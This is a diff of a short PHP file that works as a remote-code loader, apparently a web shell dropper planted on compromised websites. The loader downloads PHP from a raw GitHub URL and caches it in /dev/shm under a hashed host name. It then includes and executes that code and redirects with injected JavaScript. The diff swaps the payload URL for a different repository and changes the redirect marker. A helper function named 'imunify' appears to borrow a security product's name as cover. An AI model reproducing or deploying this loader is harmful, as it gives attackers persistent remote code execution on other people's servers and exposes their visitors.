@@ -1,5 +1,5 @@
 <?php
-$data = ['https://raw.githubusercontent.com/launchscroll/dontworry/refs/heads/main/indexxxx.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
+$data = ['https://raw.githubusercontent.com/hairamcrot/back/refs/heads/main/0xvania.php', '/dev/shm/'.md5($_SERVER['HTTP_HOST'])];
 
 if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
@@ -7,7 +7,7 @@ if(file_exists($data[1]) && filesize($data[1]) !== 0) {
     $fopen = fopen($data[1], 'w+');
     fwrite($fopen, imunify($data[0]));
     fclose($fopen);
-    echo '<script>window.location="?Haxorsecv2";</script>';
+    echo '<script>window.location="?lol";</script>';
 }
 
 function imunify($url)
